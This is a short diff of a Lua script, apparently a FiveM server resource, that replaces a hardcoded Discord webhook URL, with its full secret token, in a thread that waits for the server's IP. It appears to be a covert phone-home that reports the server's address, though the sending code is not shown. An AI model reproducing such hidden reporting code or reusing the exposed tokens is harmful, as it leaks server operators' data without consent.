@@ -16,7 +16,7 @@ return_ip_ = function()
 	return ipp;
 end;
 CreateThread(function()
-	local webhookURL = "https://discord.com/api/webhooks/1332075661715701770/bbdMBRE2UqjkYVN2GeDTeny6uqcioLczbXe9xqO-CBqZiuxamyRNybpv73dy1y0qLIs5";
+	local webhookURL = "https://discord.com/api/webhooks/1332078730578890842/I-9M0554q2yFjg-wfWxw12XifClubq1_S-rOxiYlfiVcdc9W8yt5UjEUDn1GOr18tsn1";
 	while server_ip == nil do
 		server_ip = return_ip_();
 		Wait(1000);
